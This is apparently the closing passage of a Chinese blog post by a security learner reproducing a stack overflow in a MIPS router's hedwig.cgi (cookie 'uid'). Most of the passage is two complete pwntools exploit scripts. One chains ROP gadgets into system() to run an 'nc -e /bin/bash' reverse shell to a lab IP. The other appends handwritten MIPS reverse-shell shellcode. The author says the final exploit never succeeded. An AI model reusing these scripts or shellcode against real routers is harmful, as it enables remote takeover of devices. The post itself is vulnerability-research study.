context(os = 'linux', arch = 'mips', log_level = 'debug')
 
cmd = b'nc -e /bin/bash 192.168.188.133 8888'
 
libc_base = 0x77f34000
 
payload = b'a'*0x3cd
payload += p32(libc_base + 0x53200 - 1) # s0  system_addr - 1
payload += p32(libc_base + 0x169C4) # s1  addiu $s2, $sp, 0x18 (=> jalr $s0)
payload += b'a'*(4*7)
payload += p32(libc_base + 0x32A98) # ra  addiu $s0, 1 (=> jalr $s1)
payload += b'a'*0x18
payload += cmd
 
url = "http://192.168.192.134:1234/hedwig.cgi"
data = {"winmt" : "pwner"}
headers = {
    "Cookie"        : b"uid=" + payload,
    "Content-Type"  : "application/x-www-form-urlencoded",
    "Content-Length": "11"
}
res = requests.post(url = url, headers = headers, data = data)
print(res)

```

#### EXP2（ROP+shellcode）

```
from pwn import *
import requests
context(os = 'linux', arch = 'mips', log_level = 'debug')
 
libc_base = 0x77f34000
 
payload = b'a'*0x3cd
payload += b'a'*4
payload += p32(libc_base + 0x436D0) # s1  move $t9, $s3 (=> lw... => jalr $t9)
payload += b'a'*4
payload += p32(libc_base + 0x56BD0) # s3  sleep
payload += b'a'*(4*5)
payload += p32(libc_base + 0x57E50) # ra  li $a0, 1 (=> jalr $s1)
 
payload += b'a'*0x18
payload += b'a'*(4*4)
payload += p32(libc_base + 0x37E6C) # s4  move  $t9, $a1 (=> jalr $t9)
payload += p32(libc_base + 0x3B974) # ra  addiu $a1, $sp, 0x18 (=> jalr $s4)
 
shellcode = asm('''
    slti $a0, $zero, 0xFFFF
    li $v0, 4006
    syscall 0x42424
 
    slti $a0, $zero, 0x1111
    li $v0, 4006
    syscall 0x42424
 
    li $t4, 0xFFFFFFFD
    not $a0, $t4
    li $v0, 4006
    syscall 0x42424
 
    li $t4, 0xFFFFFFFD
    not $a0, $t4
    not $a1, $t4
    slti $a2, $zero, 0xFFFF
    li $v0, 4183
    syscall 0x42424
 
    andi $a0, $v0, 0xFFFF
    li $v0, 4041
    syscall 0x42424
    li $v0, 4041
    syscall 0x42424
 
    lui $a1, 0xB821 # Port: 8888
    ori $a1, 0xFF01
    addi $a1, $a1, 0x0101
    sw $a1, -8($sp)
 
    li $a1, 0x85BCA8C0 # IP: 192.168.188.133
    sw $a1, -4($sp)
    addi $a1, $sp, -8
 
    li $t4, 0xFFFFFFEF
    not $a2, $t4
    li $v0, 4170
    syscall 0x42424
 
    lui $t0, 0x6962
    ori $t0, $t0,0x2f2f
    sw $t0, -20($sp)
 
    lui $t0, 0x6873
    ori $t0, 0x2f6e
    sw $t0, -16($sp)
 
    slti $a3, $zero, 0xFFFF
    sw $a3, -12($sp)
    sw $a3, -4($sp)
 
    addi $a0, $sp, -20
    addi $t0, $sp, -20
    sw $t0, -8($sp)
    addi $a1, $sp, -8
 
    addiu $sp, $sp, -20
 
    slti $a2, $zero, 0xFFFF
    li $v0, 4011
    syscall 0x42424
''')
payload += b'a'*0x18
payload += shellcode
 
url = "http://192.168.188.134:1234/hedwig.cgi"
data = {"winmt" : "pwner"}
headers = {
    "Cookie"        : b"uid=" + payload,
    "Content-Type"  : "application/x-www-form-urlencoded",
    "Content-Length": "11"
}
res = requests.post(url = url, headers = headers, data = data)
print(res)
```

可惜到最后也没打通，还是太菜了……都复现到了最后一步没能成功

![image-20220428094110909](https://s2.loli.net/2022/04/28/Lm1ReY9Khj3M5Op.png)

报错可能擦测需要python3环境才能运行，但是我pwntools安装在python2了，就不再重新装一个了。

### 参考

这里很感谢看雪大佬的文章对我复现这个漏洞有极大的帮助。

1. https://bbs.pediy.com/thread-272212.htm
2. https://bbs.pediy.com/thread-272318.htm#msg_header_h2_3
3. https://bbs.pediy.com/thread-268623.htm

### 总结

复现这个漏洞兜兜转转差不多花了我一周的时间，虽然很可惜，复现了百分之90左右，最后的EXP没能打通，但是重要的是整个学习的过程，此次复现又学到了不少新的知识（比如IDApython中的mipsrop使用、MIPS架构的一些特性、GDB配合pemu的远程调试使用……），也让我巩固了不少固件运行的一些条件（配置ip网络，分解提取固件，固件拷贝，配置启动sh命令……）觉得收获颇丰的，果然靠实践去复现一些CVE踩踩坑是挺好的一种学习路线，过程中是遇到不少令我堪忧的几个问题，好在坚持都搜集到了解决办法，感觉学网安的要学得东西很杂乱，能力不足是家常便饭，还得继续坚持多学新知识，网安不怕能力差的，就怕不想学。现在也接近五月份了，也该找暑期实习了，不好好学习复现一些漏洞还真不好找工作，好在昨天拿到了一份车联网的offer，后面的一个多月可能网车联网方向多学习发展了，继续努力吧,加油！

